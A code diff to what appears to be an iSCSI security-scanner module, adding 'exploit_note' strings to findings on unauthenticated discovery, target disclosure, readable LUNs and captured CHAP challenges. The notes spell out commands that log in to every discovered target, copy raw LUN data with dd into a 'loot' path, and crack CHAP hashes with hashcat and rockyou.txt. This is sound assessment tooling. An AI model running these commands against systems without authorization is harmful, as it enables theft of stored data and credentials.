@@ -741,7 +741,11 @@ def _emit_auth_none_discovery(out, pr, tgt, h, p):
         f"iscsiadm -m discovery -t sendtargets -p {h.ip}:{p.portid}",
         "Set node.session.auth.authmethod=CHAP (or KRB5) on Discovery; disable "
         "AuthMethod=None on the target portal.",
-        ["CWE-306"], kind="iscsi_auth_none_discovery"))
+        ["CWE-306"], kind="iscsi_auth_none_discovery",
+        exploit_note=(
+            f"iscsiadm -m discovery -t sendtargets -p {h.ip}:{p.portid}  "
+            "# captures every TargetName/TargetAddress"),
+        depth_tier="t1"))
 
 
 def _emit_sendtargets(out, pr, tgt, h, p):
@@ -762,7 +766,12 @@ def _emit_sendtargets(out, pr, tgt, h, p):
         f"iscsiadm -m discovery -t sendtargets -p {h.ip}:{p.portid}",
         "Enforce CHAP/KRB5 on the Discovery portal; treat the IQN list and "
         "portal-address list as sensitive (they leak internal topology).",
-        ["CWE-200"], kind="iscsi_targets_disclosed"))
+        ["CWE-200"], kind="iscsi_targets_disclosed",
+        exploit_note=(
+            "for iqn in $(iscsiadm -m discovery -t sendtargets -p "
+            f"{h.ip}:{p.portid} | awk '{{print $2}}'); do iscsiadm -m node "
+            f"-T $iqn -p {h.ip}:{p.portid} --login; done"),
+        depth_tier="t1"))
 
 
 def _emit_auth_none_normal(out, pr, tgt, h, p):
@@ -780,7 +789,12 @@ def _emit_auth_none_normal(out, pr, tgt, h, p):
         f"iscsiadm -m node -T <iqn> -p {h.ip}:{p.portid} --login",
         "Require CHAP or KRB5 for Normal sessions; configure LUN masking on the "
         "array so unauthorized initiators cannot enumerate LUNs.",
-        ["CWE-306", "CWE-284"], kind="iscsi_auth_none_normal"))
+        ["CWE-306", "CWE-284"], kind="iscsi_auth_none_normal",
+        exploit_note=(
+            f"modprobe iscsi_tcp; iscsiadm -m node -T <iqn> -p {h.ip}:{p.portid} "
+            "--login; ls /dev/disk/by-path/*iscsi*; dd if=/dev/sdX bs=1M count=64 "
+            "of=/tmp/lun0.img; file /tmp/lun0.img"),
+        depth_tier="t2"))
 
 
 def _emit_scsi(out, pr, tgt, h, p):
@@ -800,7 +814,11 @@ def _emit_scsi(out, pr, tgt, h, p):
             f"sg_inq /dev/disk/by-path/ip-{h.ip}:{p.portid}-iscsi-<iqn>-lun-0",
             "Enforce authentication and LUN masking so LUN 0 is not visible to "
             "arbitrary initiators.",
-            ["CWE-306"], kind="iscsi_inquiry_leak"))
+            ["CWE-306"], kind="iscsi_inquiry_leak",
+            exploit_note=(
+                f"sg_inq /dev/disk/by-path/ip-{h.ip}:{p.portid}-iscsi-<iqn>-lun-0 "
+                "; sg_readcap same device"),
+            depth_tier="t2"))
     if rc.get("blocks"):
         cap = rc.get("capacity_bytes", 0)
         out.append(_finding(
@@ -814,7 +832,11 @@ def _emit_scsi(out, pr, tgt, h, p):
             f"sg_readcap /dev/disk/by-path/ip-{h.ip}:{p.portid}-iscsi-<iqn>-lun-0",
             "Configure LUN masking so an unauthenticated initiator cannot see "
             "LUN 0; enforce CHAP/KRB5 on Normal sessions.",
-            ["CWE-306"], kind="iscsi_lun_readable"))
+            ["CWE-306"], kind="iscsi_lun_readable",
+            exploit_note=(
+                "sg_readcap /dev/disk/by-path/...-lun-0 ; then dd if=/dev/sdX "
+                "of=lun0.raw bs=1M count=1 ; file lun0.raw"),
+            depth_tier="t2"))
 
 
 def _emit_chap(out, pr, tgt, h, p):
@@ -832,7 +854,12 @@ def _emit_chap(out, pr, tgt, h, p):
             "# format: <CHAP_R>:<CHAP_C>:<CHAP_I>\nhashcat -m 4800 iscsi.chap wordlist.txt",
             "Enforce a high-entropy CHAP secret (16+ chars); scope 3260/tcp to "
             "the initiator subnet.",
-            ["CWE-916", "CWE-287"], kind="iscsi_chap_challenge_captured"))
+            ["CWE-916", "CWE-287"], kind="iscsi_chap_challenge_captured",
+            exploit_note=(
+                "printf '<CHAP_R>:<CHAP_C>:<CHAP_I>\\n' > loot/iscsi.chap ; "
+                "hashcat -m 4800 loot/iscsi.chap "
+                "/usr/share/wordlists/rockyou.txt --force"),
+            depth_tier="t2"))
     if pr.get("chap_one_way"):
         out.append(_finding(
             "medium",
